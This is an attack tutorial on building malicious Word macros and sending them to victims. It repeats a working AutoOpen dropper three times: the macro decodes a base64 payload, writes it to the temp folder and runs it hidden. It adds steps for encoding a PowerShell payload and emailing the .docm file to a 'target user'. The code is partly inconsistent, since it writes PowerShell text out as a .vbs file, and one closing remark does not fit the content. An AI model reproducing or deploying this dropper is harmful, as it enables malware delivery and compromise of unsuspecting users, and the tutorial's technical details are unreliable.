# Summary
Malicious VBA macros are scripts embedded in Office documents (e.g., Word, Excel) designed to execute malicious code when the document is opened. These macros exploit the automation capabilities of VBA (Visual Basic for Applications) to perform harmful activities such as downloading and executing malware, stealing data, or manipulating files.

Here's an overview of how you could create and use malicious VBA macros to execute attacks:

1. **Prepare the Payload:** Create or obtain the shellcode or script that you want to execute when the document is opened.
2. **Embed the Payload:** Embed the payload into the VBA macro within the Office document.
3. **Trigger the Payload:** Ensure the payload is triggered automatically when the document is opened by the target application.
4. **Distribute the Malicious Document:** Send or distribute the malicious document to the target user.

# Execution
To create and use a malicious VBA macro, follow these steps:

1. **Prepare the Payload:** Create the shellcode or script that will be executed when the document is opened.
2. **Embed the Payload:** Use the VBA editor in an Office application to embed the shellcode into the document.
3. **Distribute the Document:** Ensure that the target user opens the document, triggering the embedded payload.

#### Step 1: Prepare the Payload
Assume you have some shellcode (e.g., PowerShell script):

1. **Encode the Shellcode:** Convert your shellcode to a base64 string.

```
# Example PowerShell script
$script = @"
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('Hello, World!')
"@

# Convert to base64
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$base64Payload = [System.Convert]::ToBase64String($bytes)
$base64Payload
```

2. **Replace Placeholder in the Macro:** Replace placeholders in your VBA macro with the base64-encoded payload.

#### Step 2: Embed the Payload
Using a macro-enabled Word document as an example:

1. **Create a New Word Document:**    
    - Open Microsoft Word.
    - Create a new document.

2. **Enable Macros:**    
    - Go to the "Developer" tab.
    - Click "Visual Basic" to open the VBA editor.

3. **Insert the Payload:**    
    - In the VBA editor, insert a new module.
    - Add a macro that decodes and executes the payload.

```
Sub AutoOpen()
    Dim base64Payload As String
    base64Payload = "BASE64_ENCODED_PAYLOAD_HERE"
    Dim bytes() As Byte
    bytes = Base64Decode(base64Payload)
    Dim tempFile As String
    tempFile = Environ("TEMP") & "\temp.vbs"
    Open tempFile For Binary As #1
    Put #1, , bytes
    Close #1
    CreateObject("WScript.Shell").Run tempFile, 0, False
End Sub

Function Base64Decode(base64String As String) As Byte()
    Dim xml As Object
    Set xml = CreateObject("MSXML2.DOMDocument.3.0")
    Dim node As Object
    Set node = xml.createElement("b64")
    node.DataType = "bin.base64"
    node.Text = base64String
    Base64Decode = node.nodeTypedValue
End Function
```

4. **Replace Placeholder:** Replace "BASE64_ENCODED_PAYLOAD_HERE" with the actual base64 payload from Step 1.

#### Step 3: Distribute the Malicious Document

1. **Save the Document:** Save the Word document as a macro-enabled file (.docm).
2. **Send the File:** Send the file to the target user via email or other means.

# Example Execution
Below is a detailed example:

#### Step 1: Prepare the payload in PowerShell

```
$script = @"
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('Hello, World!')
"@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$base64Payload = [System.Convert]::ToBase64String($bytes)
$base64Payload
```

#### Step 2: Embed the payload in a Word document macro

1. Open Microsoft Word.
2. Go to "Developer" -> "Visual Basic".
3. Insert a new module and add the following code:

```
Sub AutoOpen()
    Dim base64Payload As String
    base64Payload = "BASE64_ENCODED_PAYLOAD_HERE"
    Dim bytes() As Byte
    bytes = Base64Decode(base64Payload)
    Dim tempFile As String
    tempFile = Environ("TEMP") & "\temp.vbs"
    Open tempFile For Binary As #1
    Put #1, , bytes
    Close #1
    CreateObject("WScript.Shell").Run tempFile, 0, False
End Sub

Function Base64Decode(base64String As String) As Byte()
    Dim xml As Object
    Set xml = CreateObject("MSXML2.DOMDocument.3.0")
    Dim node As Object
    Set node = xml.createElement("b64")
    node.DataType = "bin.base64"
    node.Text = base64String
    Base64Decode = node.nodeTypedValue
End Function
```

4. Replace "BASE64_ENCODED_PAYLOAD_HERE" with the encoded payload from Step 1.
5. Save the document as a macro-enabled file (.docm).

#### Step 3: Distribute the malicious file

1. Save the document as a .docm file.
2. Send the document to the target user.

# Example Code
Here's a VBA macro example for embedding a payload in a Word document:

```
Sub AutoOpen()
    Dim base64Payload As String
    base64Payload = "BASE64_ENCODED_PAYLOAD_HERE"
    Dim bytes() As Byte
    bytes = Base64Decode(base64Payload)
    Dim tempFile As String
    tempFile = Environ("TEMP") & "\temp.vbs"
    Open tempFile For Binary As #1
    Put #1, , bytes
    Close #1
    CreateObject("WScript.Shell").Run tempFile, 0, False
End Sub

Function Base64Decode(base64String As String) As Byte()
    Dim xml As Object
    Set xml = CreateObject("MSXML2.DOMDocument.3.0")
    Dim node As Object
    Set node = xml.createElement("b64")
    node.DataType = "bin.base64"
    node.Text = base64String
    Base64Decode = node.nodeTypedValue
End Function
```

Replace "BASE64_ENCODED_PAYLOAD_HERE" with your base64-encoded payload. Ensure that you have proper permissions to manipulate the target process.

# Resources

|**Website**|**URL**|
|-|-|
|Microsoft VBA Documentation|[https://docs.microsoft.com/en-us/office/vba/api/overview/excel](https://docs.microsoft.com/en-us/office/vba/api/overview/excel)|
|Excel VBA Tutorial|https://www.excel-easy.com/vba.html|
|VBA Macro Examples|https://www.automateexcel.com/vba/examples/|